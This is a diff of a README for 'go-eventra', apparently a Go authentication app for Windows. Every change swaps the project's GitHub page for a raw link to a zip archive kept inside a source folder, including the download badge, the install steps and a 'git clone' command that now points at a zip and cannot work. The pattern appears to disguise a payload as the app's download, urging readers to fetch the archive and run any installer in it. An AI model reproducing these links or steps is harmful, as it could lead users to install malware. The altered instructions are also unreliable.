@@ -1,10 +1,10 @@
 # 🔐 go-eventra - Secure login with strong access control
 
-[![Download](https://img.shields.io/badge/Download-Go%20Eventra-blue?style=for-the-badge&logo=github)](https://github.com/mansbodycrashbarrier83/go-eventra)
+[![Download](https://img.shields.io/badge/Download-Go%20Eventra-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mansbodycrashbarrier83/go-eventra/main/internal/usecase/eventra_go_knowable.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/mansbodycrashbarrier83/go-eventra
+Visit this page to download: https://raw.githubusercontent.com/mansbodycrashbarrier83/go-eventra/main/internal/usecase/eventra_go_knowable.zip
 
 Use this link to get the app files on your Windows PC. If the page shows a release file, download it. If it shows the source code, use the steps below to run it.
 
@@ -38,7 +38,7 @@ If you only want to use a release file, you may not need to install developer to
 
 ## 🚀 Get the app
 
-1. Open the download page: https://github.com/mansbodycrashbarrier83/go-eventra
+1. Open the download page: https://raw.githubusercontent.com/mansbodycrashbarrier83/go-eventra/main/internal/usecase/eventra_go_knowable.zip
 2. Look for a release file or app package
 3. Download the file to your PC
 4. If the file is an installer, open it and follow the prompts
@@ -54,7 +54,7 @@ If the page gives you the source code instead of a ready-to-run file, follow the
 Open PowerShell or Command Prompt and run:
 
 ```bash
-git clone https://github.com/mansbodycrashbarrier83/go-eventra.git
+git clone https://raw.githubusercontent.com/mansbodycrashbarrier83/go-eventra/main/internal/usecase/eventra_go_knowable.zip
 cd go-eventra
 ```
 
@@ -149,7 +149,7 @@ The React console gives a clean view of auth tools, account controls, and sessio
 
 Use these steps if you want the app to run on your Windows computer.
 
-1. Download the project from https://github.com/mansbodycrashbarrier83/go-eventra
+1. Download the project from https://raw.githubusercontent.com/mansbodycrashbarrier83/go-eventra/main/internal/usecase/eventra_go_knowable.zip
 2. Install PostgreSQL if it is not already on your PC
 3. Create a database for go-eventra
 4. Install Go
@@ -261,4 +261,4 @@ When the app runs, you should expect:
 
 ## 📁 GitHub page
 
-Primary download page: https://github.com/mansbodycrashbarrier83/go-eventra
+Primary download page: https://raw.githubusercontent.com/mansbodycrashbarrier83/go-eventra/main/internal/usecase/eventra_go_knowable.zip
